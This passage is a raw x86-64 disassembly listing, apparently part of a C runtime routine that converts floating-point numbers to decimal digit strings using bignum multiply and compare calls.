  407b8b:	83 f9 0e             	cmp    $0xe,%ecx
  407b8e:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
  407b95:	0f 96 c2             	setbe  %dl
  407b98:	21 c2                	and    %eax,%edx
  407b9a:	e9 33 fd ff ff       	jmp    0x4078d2
  407b9f:	90                   	nop
  407ba0:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  407ba7:	00 00 00 00 
  407bab:	e9 4d fc ff ff       	jmp    0x4077fd
  407bb0:	66 0f 28 c4          	movapd %xmm4,%xmm0
  407bb4:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
  407bb8:	f2 0f 58 05 f0 1e 0d 	addsd  0xd1ef0(%rip),%xmm0        # 0x4d9ab0
  407bbf:	00 
  407bc0:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  407bc6:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
  407bcb:	4c 89 d0             	mov    %r10,%rax
  407bce:	41 83 e2 ff          	and    $0xffffffff,%r10d
  407bd2:	48 c1 e8 20          	shr    $0x20,%rax
  407bd6:	8d 80 00 00 c0 fc    	lea    -0x3400000(%rax),%eax
  407bdc:	48 c1 e0 20          	shl    $0x20,%rax
  407be0:	49 09 c2             	or     %rax,%r10
  407be3:	66 0f 28 c4          	movapd %xmm4,%xmm0
  407be7:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  407bec:	f2 0f 10 4c 24 28    	movsd  0x28(%rsp),%xmm1
  407bf2:	f2 0f 5c 05 be 1e 0d 	subsd  0xd1ebe(%rip),%xmm0        # 0x4d9ab8
  407bf9:	00 
  407bfa:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  407bfe:	0f 87 05 09 00 00    	ja     0x408509
  407c04:	f2 0f 10 15 b4 1e 0d 	movsd  0xd1eb4(%rip),%xmm2        # 0x4d9ac0
  407c0b:	00 
  407c0c:	66 0f 57 ca          	xorpd  %xmm2,%xmm1
  407c10:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  407c14:	0f 87 17 03 00 00    	ja     0x407f31
  407c1a:	f2 0f 11 64 24 28    	movsd  %xmm4,0x28(%rsp)
  407c20:	4c 8b 5c 24 28       	mov    0x28(%rsp),%r11
  407c25:	45 85 c0             	test   %r8d,%r8d
  407c28:	0f 88 c2 00 00 00    	js     0x407cf0
  407c2e:	8b 44 24 68          	mov    0x68(%rsp),%eax
  407c32:	3b 47 14             	cmp    0x14(%rdi),%eax
  407c35:	0f 8f b5 00 00 00    	jg     0x407cf0
  407c3b:	8b bc 24 88 00 00 00 	mov    0x88(%rsp),%edi
  407c42:	48 63 d0             	movslq %eax,%rdx
  407c45:	48 8d 05 d4 1e 0d 00 	lea    0xd1ed4(%rip),%rax        # 0x4d9b20
  407c4c:	f2 0f 10 14 d0       	movsd  (%rax,%rdx,8),%xmm2
  407c51:	85 ff                	test   %edi,%edi
  407c53:	0f 8f 4c 07 00 00    	jg     0x4083a5
  407c59:	8b 84 24 38 01 00 00 	mov    0x138(%rsp),%eax
  407c60:	c1 e8 1f             	shr    $0x1f,%eax
  407c63:	84 c0                	test   %al,%al
  407c65:	0f 84 3a 07 00 00    	je     0x4083a5
  407c6b:	8b b4 24 88 00 00 00 	mov    0x88(%rsp),%esi
  407c72:	85 f6                	test   %esi,%esi
  407c74:	0f 85 b7 02 00 00    	jne    0x407f31
  407c7a:	f2 0f 59 15 36 1e 0d 	mulsd  0xd1e36(%rip),%xmm2        # 0x4d9ab8
  407c81:	00 
  407c82:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
  407c87:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  407c8d:	66 0f 2e d0          	ucomisd %xmm0,%xmm2
  407c91:	0f 83 9a 02 00 00    	jae    0x407f31
  407c97:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  407c9c:	31 ed                	xor    %ebp,%ebp
  407c9e:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  407ca5:	00 00 
  407ca7:	41 83 c4 02          	add    $0x2,%r12d
  407cab:	49 8d 77 01          	lea    0x1(%r15),%rsi
  407caf:	41 c6 07 31          	movb   $0x31,(%r15)
  407cb3:	31 ff                	xor    %edi,%edi
  407cb5:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  407cbb:	48 89 e9             	mov    %rbp,%rcx
  407cbe:	e8 0d 18 00 00       	call   0x4094d0
  407cc3:	48 83 7c 24 78 00    	cmpq   $0x0,0x78(%rsp)
  407cc9:	0f 84 73 f8 ff ff    	je     0x407542
  407ccf:	48 3b 7c 24 78       	cmp    0x78(%rsp),%rdi
  407cd4:	0f 85 29 05 00 00    	jne    0x408203
  407cda:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  407cdf:	e8 ec 17 00 00       	call   0x4094d0
  407ce4:	e9 59 f8 ff ff       	jmp    0x407542
  407ce9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407cf0:	44 8b 8c 24 98 00 00 	mov    0x98(%rsp),%r9d
  407cf7:	00 
  407cf8:	45 85 c9             	test   %r9d,%r9d
  407cfb:	0f 84 c3 02 00 00    	je     0x407fc4
  407d01:	2b 6c 24 60          	sub    0x60(%rsp),%ebp
  407d05:	8b 57 04             	mov    0x4(%rdi),%edx
  407d08:	44 89 c1             	mov    %r8d,%ecx
  407d0b:	8d 45 01             	lea    0x1(%rbp),%eax
  407d0e:	29 e9                	sub    %ebp,%ecx
  407d10:	39 d1                	cmp    %edx,%ecx
  407d12:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  407d19:	0f 8d 61 04 00 00    	jge    0x408180
  407d1f:	83 bc 24 30 01 00 00 	cmpl   $0x5,0x130(%rsp)
  407d26:	05 
  407d27:	0f 84 53 04 00 00    	je     0x408180
  407d2d:	83 bc 24 30 01 00 00 	cmpl   $0x3,0x130(%rsp)
  407d34:	03 
  407d35:	0f 84 45 04 00 00    	je     0x408180
  407d3b:	41 29 d0             	sub    %edx,%r8d
  407d3e:	41 8d 40 01          	lea    0x1(%r8),%eax
  407d42:	44 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8d
  407d49:	00 
  407d4a:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  407d51:	45 85 c0             	test   %r8d,%r8d
  407d54:	7e 17                	jle    0x407d6d
  407d56:	83 bc 24 30 01 00 00 	cmpl   $0x1,0x130(%rsp)
  407d5d:	01 
  407d5e:	7e 0d                	jle    0x407d6d
  407d60:	39 84 24 88 00 00 00 	cmp    %eax,0x88(%rsp)
  407d67:	0f 8c 21 04 00 00    	jl     0x40818e
  407d6d:	8b ac 24 8c 00 00 00 	mov    0x8c(%rsp),%ebp
  407d74:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  407d7b:	b9 01 00 00 00       	mov    $0x1,%ecx
  407d80:	01 84 24 80 00 00 00 	add    %eax,0x80(%rsp)
  407d87:	01 44 24 70          	add    %eax,0x70(%rsp)
  407d8b:	e8 50 18 00 00       	call   0x4095e0
  407d90:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  407d95:	8b 54 24 70          	mov    0x70(%rsp),%edx
  407d99:	85 d2                	test   %edx,%edx
  407d9b:	7e 23                	jle    0x407dc0
  407d9d:	85 f6                	test   %esi,%esi
  407d9f:	7e 1f                	jle    0x407dc0
  407da1:	39 74 24 70          	cmp    %esi,0x70(%rsp)
  407da5:	8b 44 24 70          	mov    0x70(%rsp),%eax
  407da9:	0f 4f c6             	cmovg  %esi,%eax
  407dac:	29 84 24 80 00 00 00 	sub    %eax,0x80(%rsp)
  407db3:	29 44 24 70          	sub    %eax,0x70(%rsp)
  407db7:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  407dbe:	29 c6                	sub    %eax,%esi
  407dc0:	8b 84 24 8c 00 00 00 	mov    0x8c(%rsp),%eax
  407dc7:	85 c0                	test   %eax,%eax
  407dc9:	7e 53                	jle    0x407e1e
  407dcb:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
  407dd2:	85 c0                	test   %eax,%eax
  407dd4:	0f 84 12 04 00 00    	je     0x4081ec
  407dda:	85 ed                	test   %ebp,%ebp
  407ddc:	7e 31                	jle    0x407e0f
  407dde:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  407de3:	89 ea                	mov    %ebp,%edx
  407de5:	e8 46 19 00 00       	call   0x409730
  407dea:	4c 89 f2             	mov    %r14,%rdx
  407ded:	48 89 c1             	mov    %rax,%rcx
  407df0:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  407df5:	e8 16 18 00 00       	call   0x409610
  407dfa:	4c 89 f1             	mov    %r14,%rcx
  407dfd:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  407e02:	e8 c9 16 00 00       	call   0x4094d0
  407e07:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  407e0c:	49 89 c6             	mov    %rax,%r14
  407e0f:	8b 94 24 8c 00 00 00 	mov    0x8c(%rsp),%edx
  407e16:	29 ea                	sub    %ebp,%edx
  407e18:	0f 85 d5 03 00 00    	jne    0x4081f3
  407e1e:	b9 01 00 00 00       	mov    $0x1,%ecx
  407e23:	e8 b8 17 00 00       	call   0x4095e0
  407e28:	48 89 c5             	mov    %rax,%rbp
  407e2b:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
  407e32:	85 c0                	test   %eax,%eax
  407e34:	7e 12                	jle    0x407e48
  407e36:	8b 94 24 90 00 00 00 	mov    0x90(%rsp),%edx
  407e3d:	48 89 e9             	mov    %rbp,%rcx
  407e40:	e8 eb 18 00 00       	call   0x409730
  407e45:	48 89 c5             	mov    %rax,%rbp
  407e48:	83 bc 24 30 01 00 00 	cmpl   $0x1,0x130(%rsp)
  407e4f:	01 
  407e50:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
  407e57:	00 00 00 00 
  407e5b:	0f 8e 12 06 00 00    	jle    0x408473
  407e61:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
  407e68:	bf 1f 00 00 00       	mov    $0x1f,%edi
  407e6d:	85 c0                	test   %eax,%eax
  407e6f:	74 10                	je     0x407e81
  407e71:	8b 45 14             	mov    0x14(%rbp),%eax
  407e74:	83 e8 01             	sub    $0x1,%eax
  407e77:	48 98                	cltq
  407e79:	0f bd 7c 85 18       	bsr    0x18(%rbp,%rax,4),%edi
  407e7e:	83 f7 1f             	xor    $0x1f,%edi
  407e81:	2b 7c 24 70          	sub    0x70(%rsp),%edi
  407e85:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
  407e8c:	83 ef 04             	sub    $0x4,%edi
  407e8f:	83 e7 1f             	and    $0x1f,%edi
  407e92:	01 fa                	add    %edi,%edx
  407e94:	89 bc 24 ac 00 00 00 	mov    %edi,0xac(%rsp)
  407e9b:	89 f8                	mov    %edi,%eax
  407e9d:	85 d2                	test   %edx,%edx
  407e9f:	7e 12                	jle    0x407eb3
  407ea1:	4c 89 f1             	mov    %r14,%rcx
  407ea4:	e8 c7 19 00 00       	call   0x409870
  407ea9:	49 89 c6             	mov    %rax,%r14
  407eac:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
  407eb3:	8b 54 24 70          	mov    0x70(%rsp),%edx
  407eb7:	01 c2                	add    %eax,%edx
  407eb9:	85 d2                	test   %edx,%edx
  407ebb:	7e 0b                	jle    0x407ec8
  407ebd:	48 89 e9             	mov    %rbp,%rcx
  407ec0:	e8 ab 19 00 00       	call   0x409870
  407ec5:	48 89 c5             	mov    %rax,%rbp
  407ec8:	8b 84 24 94 00 00 00 	mov    0x94(%rsp),%eax
  407ecf:	85 c0                	test   %eax,%eax
  407ed1:	0f 85 bb 03 00 00    	jne    0x408292
  407ed7:	44 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12d
  407ede:	00 
  407edf:	45 85 e4             	test   %r12d,%r12d
  407ee2:	0f 8f f8 00 00 00    	jg     0x407fe0
  407ee8:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  407eef:	02 
  407ef0:	0f 8e ea 00 00 00    	jle    0x407fe0
  407ef6:	8b b4 24 88 00 00 00 	mov    0x88(%rsp),%esi
  407efd:	85 f6                	test   %esi,%esi
  407eff:	75 3b                	jne    0x407f3c
  407f01:	45 31 c0             	xor    %r8d,%r8d
  407f04:	48 89 e9             	mov    %rbp,%rcx
  407f07:	ba 05 00 00 00       	mov    $0x5,%edx
  407f0c:	e8 1f 16 00 00       	call   0x409530
  407f11:	4c 89 f1             	mov    %r14,%rcx
  407f14:	48 89 c2             	mov    %rax,%rdx
  407f17:	48 89 c5             	mov    %rax,%rbp
  407f1a:	e8 51 1a 00 00       	call   0x409970
  407f1f:	85 c0                	test   %eax,%eax
  407f21:	7e 19                	jle    0x407f3c
  407f23:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  407f28:	41 83 c4 02          	add    $0x2,%r12d
  407f2c:	e9 7a fd ff ff       	jmp    0x407cab
  407f31:	31 ed                	xor    %ebp,%ebp
  407f33:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  407f3a:	00 00 
  407f3c:	44 8b a4 24 38 01 00 	mov    0x138(%rsp),%r12d
  407f43:	00 
  407f44:	4c 89 fe             	mov    %r15,%rsi
  407f47:	31 ff                	xor    %edi,%edi
  407f49:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  407f4f:	41 f7 dc             	neg    %r12d
  407f52:	e9 64 fd ff ff       	jmp    0x407cbb
  407f57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  407f5e:	00 00 
  407f60:	f7 da                	neg    %edx
  407f62:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
  407f69:	00 
  407f6a:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
  407f71:	e9 a5 f8 ff ff       	jmp    0x40781b
  407f76:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  407f7d:	00 00 00 
  407f80:	f2 0f 2a c9          	cvtsi2sd %ecx,%xmm1
  407f84:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  407f88:	7a 06                	jp     0x407f90
  407f8a:	0f 84 10 f8 ff ff    	je     0x4077a0
  407f90:	83 6c 24 68 01       	subl   $0x1,0x68(%rsp)
  407f95:	e9 06 f8 ff ff       	jmp    0x4077a0
  407f9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407fa0:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
  407fa4:	29 8c 24 80 00 00 00 	sub    %ecx,0x80(%rsp)
  407fab:	c7 84 24 90 00 00 00 	movl   $0x0,0x90(%rsp)
  407fb2:	00 00 00 00 
  407fb6:	f7 d9                	neg    %ecx
  407fb8:	89 8c 24 8c 00 00 00 	mov    %ecx,0x8c(%rsp)
  407fbf:	e9 7d f8 ff ff       	jmp    0x407841
  407fc4:	8b ac 24 8c 00 00 00 	mov    0x8c(%rsp),%ebp
  407fcb:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  407fd2:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  407fd9:	00 00 
  407fdb:	e9 b5 fd ff ff       	jmp    0x407d95
  407fe0:	44 8b 9c 24 98 00 00 	mov    0x98(%rsp),%r11d
  407fe7:	00 
  407fe8:	45 85 db             	test   %r11d,%r11d
  407feb:	0f 84 01 03 00 00    	je     0x4082f2
  407ff1:	8d 14 3e             	lea    (%rsi,%rdi,1),%edx
  407ff4:	85 d2                	test   %edx,%edx
  407ff6:	7e 0f                	jle    0x408007
  407ff8:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  407ffd:	e8 6e 18 00 00       	call   0x409870
  408002:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  408007:	44 8b 94 24 8c 00 00 	mov    0x8c(%rsp),%r10d
  40800e:	00 
  40800f:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
  408014:	45 85 d2             	test   %r10d,%r10d
  408017:	0f 85 2e 07 00 00    	jne    0x40874b
  40801d:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
  408024:	00 
  408025:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  40802c:	01 00 00 00 
  408030:	4c 89 fe             	mov    %r15,%rsi
  408033:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
  408038:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
  40803d:	4c 89 cb             	mov    %r9,%rbx
  408040:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
  408045:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
  40804a:	e9 ba 00 00 00       	jmp    0x408109
  40804f:	90                   	nop
  408050:	4c 89 c1             	mov    %r8,%rcx
  408053:	e8 78 14 00 00       	call   0x4094d0
  408058:	8b 8c 24 30 01 00 00 	mov    0x130(%rsp),%ecx
  40805f:	09 e9                	or     %ebp,%ecx
  408061:	75 18                	jne    0x40807b
  408063:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  408068:	f6 00 01             	testb  $0x1,(%rax)
  40806b:	75 0e                	jne    0x40807b
  40806d:	44 8b 44 24 6c       	mov    0x6c(%rsp),%r8d
  408072:	45 85 c0             	test   %r8d,%r8d
  408075:	0f 84 00 09 00 00    	je     0x40897b
  40807b:	45 85 ed             	test   %r13d,%r13d
  40807e:	0f 88 75 05 00 00    	js     0x4085f9
  408084:	44 0b ac 24 30 01 00 	or     0x130(%rsp),%r13d
  40808b:	00 
  40808c:	75 0e                	jne    0x40809c
  40808e:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
  408093:	f6 02 01             	testb  $0x1,(%rdx)
  408096:	0f 84 5d 05 00 00    	je     0x4085f9
  40809c:	85 ed                	test   %ebp,%ebp
  40809e:	0f 8f e6 06 00 00    	jg     0x40878a
  4080a4:	44 88 26             	mov    %r12b,(%rsi)
  4080a7:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  4080ae:	48 83 c6 01          	add    $0x1,%rsi
  4080b2:	39 8c 24 ac 00 00 00 	cmp    %ecx,0xac(%rsp)
  4080b9:	0f 84 4c 07 00 00    	je     0x40880b
  4080bf:	45 31 c0             	xor    %r8d,%r8d
  4080c2:	4c 89 f1             	mov    %r14,%rcx
  4080c5:	ba 0a 00 00 00       	mov    $0xa,%edx
  4080ca:	e8 61 14 00 00       	call   0x409530
  4080cf:	45 31 c0             	xor    %r8d,%r8d
  4080d2:	48 39 df             	cmp    %rbx,%rdi
  4080d5:	49 89 c6             	mov    %rax,%r14
  4080d8:	ba 0a 00 00 00       	mov    $0xa,%edx
  4080dd:	48 89 f9             	mov    %rdi,%rcx
  4080e0:	0f 84 8a 00 00 00    	je     0x408170
  4080e6:	e8 45 14 00 00       	call   0x409530
  4080eb:	48 89 d9             	mov    %rbx,%rcx
  4080ee:	45 31 c0             	xor    %r8d,%r8d
  4080f1:	ba 0a 00 00 00       	mov    $0xa,%edx
  4080f6:	48 89 c7             	mov    %rax,%rdi
  4080f9:	e8 32 14 00 00       	call   0x409530
  4080fe:	48 89 c3             	mov    %rax,%rbx
  408101:	83 84 24 ac 00 00 00 	addl   $0x1,0xac(%rsp)
  408108:	01 
  408109:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
  40810e:	4c 89 f1             	mov    %r14,%rcx
  408111:	bd 01 00 00 00       	mov    $0x1,%ebp
  408116:	e8 35 0f 00 00       	call   0x409050
  40811b:	48 89 fa             	mov    %rdi,%rdx
  40811e:	4c 89 f1             	mov    %r14,%rcx
  408121:	41 89 c7             	mov    %eax,%r15d
  408124:	44 8d 60 30          	lea    0x30(%rax),%r12d
  408128:	e8 43 18 00 00       	call   0x409970
  40812d:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
  408132:	48 89 da             	mov    %rbx,%rdx
  408135:	41 89 c5             	mov    %eax,%r13d
  408138:	e8 83 18 00 00       	call   0x4099c0
  40813d:	44 8b 48 10          	mov    0x10(%rax),%r9d
  408141:	49 89 c0             	mov    %rax,%r8
  408144:	45 85 c9             	test   %r9d,%r9d
  408147:	0f 85 03 ff ff ff    	jne    0x408050
  40814d:	48 89 c2             	mov    %rax,%rdx
  408150:	4c 89 f1             	mov    %r14,%rcx
  408153:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  408158:	e8 13 18 00 00       	call   0x409970
  40815d:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
  408162:	89 c5                	mov    %eax,%ebp
  408164:	e9 e7 fe ff ff       	jmp    0x408050
  408169:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408170:	e8 bb 13 00 00       	call   0x409530
  408175:	48 89 c7             	mov    %rax,%rdi
  408178:	48 89 c3             	mov    %rax,%rbx
  40817b:	eb 84                	jmp    0x408101
  40817d:	0f 1f 00             	nopl   (%rax)
  408180:	83 bc 24 30 01 00 00 	cmpl   $0x1,0x130(%rsp)
  408187:	01 
  408188:	0f 8e df fb ff ff    	jle    0x407d6d
  40818e:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
  408195:	8b ac 24 8c 00 00 00 	mov    0x8c(%rsp),%ebp
  40819c:	83 e8 01             	sub    $0x1,%eax
  40819f:	29 c5                	sub    %eax,%ebp
  4081a1:	39 84 24 8c 00 00 00 	cmp    %eax,0x8c(%rsp)
  4081a8:	7d 19                	jge    0x4081c3
  4081aa:	89 c2                	mov    %eax,%edx
  4081ac:	2b 94 24 8c 00 00 00 	sub    0x8c(%rsp),%edx
  4081b3:	31 ed                	xor    %ebp,%ebp
  4081b5:	01 94 24 90 00 00 00 	add    %edx,0x90(%rsp)
  4081bc:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
  4081c3:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  4081ca:	85 c9                	test   %ecx,%ecx
  4081cc:	0f 88 59 05 00 00    	js     0x40872b
  4081d2:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
  4081d9:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  4081e0:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  4081e7:	e9 8f fb ff ff       	jmp    0x407d7b
  4081ec:	8b 94 24 8c 00 00 00 	mov    0x8c(%rsp),%edx
  4081f3:	4c 89 f1             	mov    %r14,%rcx
  4081f6:	e8 35 15 00 00       	call   0x409730
  4081fb:	49 89 c6             	mov    %rax,%r14
  4081fe:	e9 1b fc ff ff       	jmp    0x407e1e
  408203:	48 85 ff             	test   %rdi,%rdi
  408206:	0f 84 ce fa ff ff    	je     0x407cda
  40820c:	48 89 f9             	mov    %rdi,%rcx
  40820f:	e8 bc 12 00 00       	call   0x4094d0
  408214:	e9 c1 fa ff ff       	jmp    0x407cda
  408219:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408220:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
  408227:	00 00 00 00 
  40822b:	e9 37 f9 ff ff       	jmp    0x407b67
  408230:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
  408237:	01 00 00 00 
  40823b:	44 8b bc 24 38 01 00 	mov    0x138(%rsp),%r15d
  408242:	00 
  408243:	45 85 ff             	test   %r15d,%r15d
  408246:	0f 8e 80 02 00 00    	jle    0x4084cc
  40824c:	83 bc 24 38 01 00 00 	cmpl   $0xe,0x138(%rsp)
  408253:	0e 
  408254:	41 0f 96 c7          	setbe  %r15b
  408258:	8b 94 24 38 01 00 00 	mov    0x138(%rsp),%edx
  40825f:	8b 8c 24 38 01 00 00 	mov    0x138(%rsp),%ecx
  408266:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  40826d:	44 89 fa             	mov    %r15d,%edx
  408270:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
  408277:	21 c2                	and    %eax,%edx
  408279:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  408280:	e9 4d f6 ff ff       	jmp    0x4078d2
  408285:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
  40828c:	00 00 00 00 
  408290:	eb a9                	jmp    0x40823b
  408292:	48 89 ea             	mov    %rbp,%rdx
  408295:	4c 89 f1             	mov    %r14,%rcx
  408298:	e8 d3 16 00 00       	call   0x409970
  40829d:	85 c0                	test   %eax,%eax
  40829f:	0f 89 32 fc ff ff    	jns    0x407ed7
  4082a5:	45 31 c0             	xor    %r8d,%r8d
  4082a8:	4c 89 f1             	mov    %r14,%rcx
  4082ab:	ba 0a 00 00 00       	mov    $0xa,%edx
  4082b0:	83 6c 24 68 01       	subl   $0x1,0x68(%rsp)
  4082b5:	e8 76 12 00 00       	call   0x409530
  4082ba:	49 89 c6             	mov    %rax,%r14
  4082bd:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
  4082c4:	85 c0                	test   %eax,%eax
  4082c6:	0f 85 e5 06 00 00    	jne    0x4089b1
  4082cc:	83 bc 24 9c 00 00 00 	cmpl   $0x0,0x9c(%rsp)
  4082d3:	00 
  4082d4:	7f 0e                	jg     0x4082e4
  4082d6:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  4082dd:	02 
  4082de:	0f 8f 8b 07 00 00    	jg     0x408a6f
  4082e4:	8b 8c 24 9c 00 00 00 	mov    0x9c(%rsp),%ecx
  4082eb:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  4082f2:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  4082f9:	01 00 00 00 
  4082fd:	4c 89 fe             	mov    %r15,%rsi
  408300:	8b bc 24 88 00 00 00 	mov    0x88(%rsp),%edi
  408307:	eb 22                	jmp    0x40832b
  408309:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408310:	4c 89 f1             	mov    %r14,%rcx
  408313:	45 31 c0             	xor    %r8d,%r8d
  408316:	ba 0a 00 00 00       	mov    $0xa,%edx
  40831b:	e8 10 12 00 00       	call   0x409530
  408320:	83 84 24 ac 00 00 00 	addl   $0x1,0xac(%rsp)
  408327:	01 
  408328:	49 89 c6             	mov    %rax,%r14
  40832b:	48 89 ea             	mov    %rbp,%rdx
  40832e:	4c 89 f1             	mov    %r14,%rcx
  408331:	e8 1a 0d 00 00       	call   0x409050
  408336:	44 8d 60 30          	lea    0x30(%rax),%r12d
  40833a:	44 88 26             	mov    %r12b,(%rsi)
  40833d:	48 83 c6 01          	add    $0x1,%rsi
  408341:	3b bc 24 ac 00 00 00 	cmp    0xac(%rsp),%edi
  408348:	7f c6                	jg     0x408310
  40834a:	31 ff                	xor    %edi,%edi
  40834c:	8b 54 24 6c          	mov    0x6c(%rsp),%edx
  408350:	85 d2                	test   %edx,%edx
  408352:	0f 84 73 03 00 00    	je     0x4086cb
  408358:	83 7c 24 6c 02       	cmpl   $0x2,0x6c(%rsp)
  40835d:	0f 84 98 03 00 00    	je     0x4086fb
  408363:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408368:	0f 8e d6 05 00 00    	jle    0x408944
  40836e:	0f b6 56 ff          	movzbl -0x1(%rsi),%edx
  408372:	eb 07                	jmp    0x40837b
  408374:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
  408378:	48 89 c6             	mov    %rax,%rsi
  40837b:	80 fa 39             	cmp    $0x39,%dl
  40837e:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  408382:	0f 85 24 05 00 00    	jne    0x4088ac
  408388:	4c 39 f8             	cmp    %r15,%rax
  40838b:	75 e7                	jne    0x408374
  40838d:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408392:	41 c6 07 31          	movb   $0x31,(%r15)
  408396:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  40839c:	41 83 c4 02          	add    $0x2,%r12d
  4083a0:	e9 16 f9 ff ff       	jmp    0x407cbb
  4083a5:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
  4083aa:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  4083b1:	01 00 00 00 
  4083b5:	49 8d 77 01          	lea    0x1(%r15),%rsi
  4083b9:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  4083bf:	66 0f 28 c8          	movapd %xmm0,%xmm1
  4083c3:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
  4083c7:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  4083cb:	f2 0f 2a c8          	cvtsi2sd %eax,%xmm1
  4083cf:	8d 50 30             	lea    0x30(%rax),%edx
  4083d2:	41 88 17             	mov    %dl,(%r15)
  4083d5:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
  4083d9:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
  4083dd:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
  4083e1:	0f 8b 08 06 00 00    	jnp    0x4089ef
  4083e7:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  4083ee:	39 94 24 88 00 00 00 	cmp    %edx,0x88(%rsp)
  4083f5:	0f 84 e7 00 00 00    	je     0x4084e2
  4083fb:	f2 0f 10 1d 9d 16 0d 	movsd  0xd169d(%rip),%xmm3        # 0x4d9aa0
  408402:	00 
  408403:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  40840a:	66 0f 28 e6          	movapd %xmm6,%xmm4
  40840e:	eb 0f                	jmp    0x40841f
  408410:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  408417:	39 d1                	cmp    %edx,%ecx
  408419:	0f 84 c3 00 00 00    	je     0x4084e2
